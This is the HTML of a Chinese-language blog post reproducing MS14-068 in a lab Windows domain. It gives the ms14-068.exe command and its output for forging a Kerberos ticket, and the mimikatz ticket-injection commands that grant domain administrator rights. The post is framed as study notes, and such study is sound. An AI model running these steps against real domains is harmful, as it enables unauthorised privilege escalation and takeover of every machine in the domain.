@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>MS14-068复现 | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="这个漏洞在当时影响力还是挺大，虽然现在在内网中出现的次数可能很少了，但是对于我们后辈来说还是值得学习下的如果哪天在内网中遇到了呢，也不慌至少有个笔记在，当时出这个漏洞的时候我还没有接触安全，所以来个笔记。 漏洞危害">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MS14-068复现">
+<meta property="og:url" content="http://yoursite.com/2018/05/30/MS16-068复现/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="这个漏洞在当时影响力还是挺大，虽然现在在内网中出现的次数可能很少了，但是对于我们后辈来说还是值得学习下的如果哪天在内网中遇到了呢，也不慌至少有个笔记在，当时出这个漏洞的时候我还没有接触安全，所以来个笔记。 漏洞危害">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2018/05/30/MS16-068复现/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/30/MS16-068复现/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/30/MS16-068复现/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/30/MS16-068复现/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/30/MS16-068复现/5.png">
+<meta property="og:updated_time" content="2018-05-30T06:17:24.050Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MS14-068复现">
+<meta name="twitter:description" content="这个漏洞在当时影响力还是挺大，虽然现在在内网中出现的次数可能很少了，但是对于我们后辈来说还是值得学习下的如果哪天在内网中遇到了呢，也不慌至少有个笔记在，当时出这个漏洞的时候我还没有接触安全，所以来个笔记。 漏洞危害">
+<meta name="twitter:image" content="http://yoursite.com/2018/05/30/MS16-068复现/1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  
+
+  <script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+  
+</head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">John Doe</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">John Doe</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author">John Doe</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="==-MS16-068复现" class="article article-type-==" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/05/30/MS16-068复现/" class="article-date">
+  	<time datetime="2018-05-30T05:13:38.000Z" itemprop="datePublished">2018-05-30</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      MS14-068复现
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这个漏洞在当时影响力还是挺大，虽然现在在内网中出现的次数可能很少了，但是对于我们后辈来说还是值得学习下的<br>如果哪天在内网中遇到了呢，也不慌至少有个笔记在，当时出这个漏洞的时候我还没有接触安全，所以来个笔记。</p>
+<h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><a id="more"></a>
+<p>   这个漏洞的主要危害是以普通域用户身份可以伪造域管理员身份。<br>   如果机器上并没有打补丁 3011780 则可能存在这个漏洞能够被恶意利用。<br>   补丁查询方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo |find &quot;3011780&quot;</span><br></pre></td></tr></table></figure></p>
+<p>涉及系统：Windows Server 2003<br>Windows Vista<br>Windows Server 2008<br>Windows 7<br>Windows Server 2008 R2<br>Windows 8 and Windows 8.1<br>Windows Server 2012 and Windows Server 2012 R2<br>Server Core installation option</p>
+<p>如果属于黑盒测试，并没有直接操作域控制器的权限，那么只能使用该漏洞，看是否能成功伪造域管理员登录来验证。</p>
+<h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><p>   域控制器: <a href="http://www.ms.com" target="_blank" rel="noopener">www.ms.com</a>  地址10.10.10.1  系统: 2003<br>   域普通用户: user 密码12345@qaz     地址 10.10.10.3  系统: 2012</p>
+<h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><p>   ms14-068.exe<br>   Mimikatz2.0以上版本</p>
+<h2 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h2><h3 id="ms14-068-工具使用"><a href="#ms14-068-工具使用" class="headerlink" title="ms14-068 工具使用"></a>ms14-068 工具使用</h3><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\user\Desktop&gt;MS14-068.exe</span><br><span class="line">USAGE:</span><br><span class="line">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">   -p &lt;clearPassword&gt;</span><br><span class="line">	--rc4 &lt;ntlmHash&gt;</span><br><span class="line"></span><br><span class="line">-u  域成员名@域名</span><br><span class="line">-s  域成员sid</span><br><span class="line">-d  域控制器地址</span><br><span class="line">-p  域成员密码</span><br></pre></td></tr></table></figure>
+</code></pre><p>如果操作正确，且域机器是可以和域控制器互通则会创建.ccache文件</p>
+<p><img src="/2018/05/30/MS16-068复现/1.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\user\Desktop&gt;MS14-068.exe -u user@www.ms.com -s S-1-5-21-198560613-2030</span><br><span class="line">144637-960732988-1106 -d www.ms.com</span><br><span class="line">Password:</span><br><span class="line">  [+] Building AS-REQ for www.ms.com... Done!</span><br><span class="line">  [+] Sending AS-REQ to www.ms.com... Done!</span><br><span class="line">  [+] Receiving AS-REP from www.ms.com... Done!</span><br><span class="line">  [+] Parsing AS-REP from www.ms.com... Done!</span><br><span class="line">  [+] Building TGS-REQ for www.ms.com... Done!</span><br><span class="line">  [+] Sending TGS-REQ to www.ms.com... Done!</span><br><span class="line">  [+] Receiving TGS-REP from www.ms.com... Done!</span><br><span class="line">  [+] Parsing TGS-REP from www.ms.com... Done!</span><br><span class="line">  [+] Creating ccache file &apos;TGT_user@www.ms.com.ccache&apos;... Done!</span><br></pre></td></tr></table></figure></p>
+<p>域成员密码错误情况图</p>
+<p><img src="/2018/05/30/MS16-068复现/2.png" alt=""></p>
+<p>获取域成员sid方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br><span class="line">用户    sid</span><br></pre></td></tr></table></figure></p>
+<h2 id="票据注入"><a href="#票据注入" class="headerlink" title="票据注入"></a>票据注入</h2><p>使用mimikatz将票据注入到当前内存中，伪造凭证，如果成功则拥有域管理权限，可任意访问域中所有机器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::purge      //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br><span class="line">mimikatz # kerberos::list          //查看当前机器凭证</span><br><span class="line">mimikatz # kerberos::ptc 票据文件         //将票据注入到内存中</span><br></pre></td></tr></table></figure></p>
+<h4 id="票据注入前的测试"><a href="#票据注入前的测试" class="headerlink" title="票据注入前的测试"></a>票据注入前的测试</h4><p><img src="/2018/05/30/MS16-068复现/3.png" alt=""></p>
+<h4 id="票据注入后的测试"><a href="#票据注入后的测试" class="headerlink" title="票据注入后的测试"></a>票据注入后的测试</h4><p><img src="/2018/05/30/MS16-068复现/4.png" alt=""></p>
+<p><img src="/2018/05/30/MS16-068复现/5.png" alt=""></p>
+<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol>
+<li>注入票据时，机器不能是03或xp，因为mimikatz不支持这两个机器注入，听大佬说过有工具可以注入，希望有知道的朋友可以@me</li>
+<li>当获取到域用户、域用户sid、密码以及可访问到域控制器的机器，并不需要机器一定在域中（如攻击者通过vpn等拨入内网），但需要把dns指向域控制器才能解析</li>
+<li>访问域控制器时，需要使用主机名，不能使用ip</li>
+<li>如有错误，请指正，万分感谢</li>
+</ol>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/05/25/几年安全学习经验杂谈/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">几年安全学习经验杂谈</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="MS16-068复现" data-title="MS14-068复现" data-url="http://yoursite.com/2018/05/30/MS16-068复现/"  data-images="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" data-content="MS14-068复现">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2018 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+<script src="/js/main.js"></script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
